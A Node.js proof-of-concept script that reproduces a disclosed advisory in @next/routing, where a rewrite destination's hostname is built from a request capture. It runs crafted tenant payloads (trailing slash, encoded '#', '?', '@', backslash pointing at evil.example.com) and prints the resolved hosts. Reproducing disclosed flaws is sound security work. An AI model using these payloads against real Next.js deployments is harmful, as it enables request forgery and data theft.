// Exploit the PUBLISHED @next/routing@16.3.4 dist artifact (not repo source).
// Mirrors GHSA-p9j2-gv94-2wf4: an external rewrite destination whose HOSTNAME
// is built from a request-controlled capture.
const { resolveRoutes } = require('./package/dist/index.js')

const mkRoutes = () => ({
  caseSensitive: false,
  beforeMiddleware: [],
  middlewareMatchers: [],
  beforeFiles: [],
  afterFiles: [{
    sourceRegex: '^/t/(?<tenant>[^/]+)$',
    destination: 'https://$tenant.api.example.com/data',
  }],
  dynamicRoutes: [],
  onMatch: [],
  fallback: [],
  shouldNormalizeNextData: false,
})

async function run(rawTenant) {
  const url = new URL('https://victim.test/t/' + rawTenant)
  const res = await resolveRoutes({
    url,
    buildId: 'test',
    basePath: '',
    requestBody: new ReadableStream({ start(c) { c.close() } }),
    headers: new Headers(),
    pathnames: [],
    routes: mkRoutes(),
    invokeMiddleware: async () => ({}),
  })
  return res
}

;(async () => {
  const cases = [
    ['benign', 'acme'],
    ['close host with /', 'evil.example.com/'],
    ['fragment #', 'evil.example.com%23'],
    ['query ?', 'evil.example.com%3F'],
    ['credentials @', 'x%40evil.example.com'],
    ['backslash', 'evil.example.com%5C'],
  ]
  console.log('@next/routing@16.3.4  (published dist/index.js)')
  console.log('rewrite destination template: https://$tenant.api.example.com/data\n')
  for (const [label, t] of cases) {
    try {
      const r = await run(t)
      const target = r?.rewrite?.href ?? r?.url?.href ?? JSON.stringify(r).slice(0, 160)
      let host = ''
      try { host = new URL(target).host } catch {}
      console.log(`  ${label.padEnd(20)} tenant=${decodeURIComponent(t).padEnd(22)} -> ${target}`)
      if (host) console.log(`  ${''.padEnd(20)} RESOLVED HOST: ${host}`)
    } catch (e) {
      console.log(`  ${label.padEnd(20)} threw: ${e.message.slice(0, 90)}`)
    }
  }
})()
